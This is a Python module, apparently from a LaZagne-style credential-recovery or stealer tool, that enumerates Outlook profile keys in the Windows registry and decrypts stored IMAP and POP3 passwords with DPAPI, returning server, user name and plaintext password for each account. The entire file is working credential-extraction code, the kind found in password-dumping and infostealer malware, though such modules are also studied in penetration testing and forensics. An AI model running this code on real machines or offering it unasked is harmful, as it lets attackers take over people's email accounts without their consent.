# -*- coding: utf-8 -*-

try:
    import _winreg as winreg
except ImportError:
    import winreg

import xdsmoc.config.winstructure as win
from xdsmoc.config.module_info import ModuleInfo
from xdsmoc.config.constant import constant


class Outlook(ModuleInfo):
    def __init__(self):
        ModuleInfo.__init__(self, 'outlook', 'mails', registry_used=True, winapi_used=True)

    def run(self):
        pwd_found = []
        key_paths = [
            'Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows Messaging Subsystem\\Profiles\\Outlook',
            'Software\\Microsoft\\Office\\14.0\\Outlook\\Profiles\\Outlook',
            'Software\\Microsoft\\Office\\15.0\\Outlook\\Profiles\\Outlook',
            'Software\\Microsoft\\Office\\16.0\\Outlook\\Profiles\\Outlook',
            'Software\\Microsoft\\Windows Messaging Subsystem\\Profiles'
        ]

        for key_path in key_paths:
            try:
                hkey = win.OpenKey(win.HKEY_CURRENT_USER, key_path)
            except Exception as e:
                continue

            try:
                num = winreg.QueryInfoKey(hkey)[0]
            except Exception as e:
                continue

            for x in range(0, num):
                try:
                    name = winreg.EnumKey(hkey, x)
                    skey = win.OpenKey(hkey, name, 0, win.ACCESS_READ)
                except Exception as e:
                    pass

                try:
                    num_skey = winreg.QueryInfoKey(skey)[0]
                except Exception as e:
                    pass

                if num_skey != 0:
                    for y in range(0, num_skey):
                        name_skey = winreg.EnumKey(skey, y)
                        sskey = win.OpenKey(skey, name_skey)
                        num_sskey = winreg.QueryInfoKey(sskey)[1]

                        for z in range(0, num_sskey):
                            k = winreg.EnumValue(sskey, z)
                            if 'password' in k[0].lower():
                                values = self.retrieve_info(sskey, name_skey)
                                if values:
                                    try:
                                        if values['IMAP Password']:
                                            Type = 'IMAP'
                                            Server = values['IMAP Server'].rstrip('\x00')
                                            User = values['IMAP User'].rstrip('\x00')
                                            Port = values['IMAP Port'].rstrip('\x00')
                                            Password = values['IMAP Password'].rstrip('\x00')
                                            SMTP_Server = values['SMTP Server'].rstrip('\x00') or ""
                                            SMTP_Port = values['SMTP Port'] or ""
                                    except Exception as e:
                                        pass

                                    try:
                                        if values['POP3 User'].rstrip('\x00'):
                                            Type = 'P0P3'
                                            Server = values['POP3 Server'].rstrip('\x00')
                                            User = values['POP3 User'].rstrip('\x00')
                                            Port = ""
                                            Password = values['POP3 Password'].rstrip('\x00')
                                            SMTP_Server = values['SMTP Server'].rstrip('\x00') or ""
                                            SMTP_Port = values['SMTP Port'] or ""
                                    except Exception as e:
                                        pass

                                    try:
                                        val = {
                                            "Type": Type,
                                            "Name": values['Display Name'].rstrip('\x00'),
                                            "Email": values['Email'].rstrip('\x00'),
                                            "Server": Server,
                                            "Port": Port,
                                            "User": User,
                                            "Password": Password,
                                            "SMTP_Server": SMTP_Server,
                                            "SMTP_Port": SMTP_Port
                                        }
                                        pwd_found.append(val)
                                    except Exception as e:
                                        pass
                winreg.CloseKey(skey)
            winreg.CloseKey(hkey)
        return pwd_found

    def retrieve_info(self, hkey, name_key):
        values = {}
        num = winreg.QueryInfoKey(hkey)[1]
        for x in range(0, num):
            k = winreg.EnumValue(hkey, x)
            if 'password' in k[0].lower():
                try:
                    password = win.Win32CryptUnprotectData(k[1][1:], is_current_user=constant.is_current_user,
                                                           user_dpapi=constant.user_dpapi)
                    values[k[0]] = password.decode('utf16')
                except Exception as e:
                    self.debug(str(e))
                    values[k[0]] = 'N/A'
            else:
                try:
                    values[k[0]] = str(k[1]).decode('utf16')
                except Exception:
                    values[k[0]] = str(k[1])
        return values
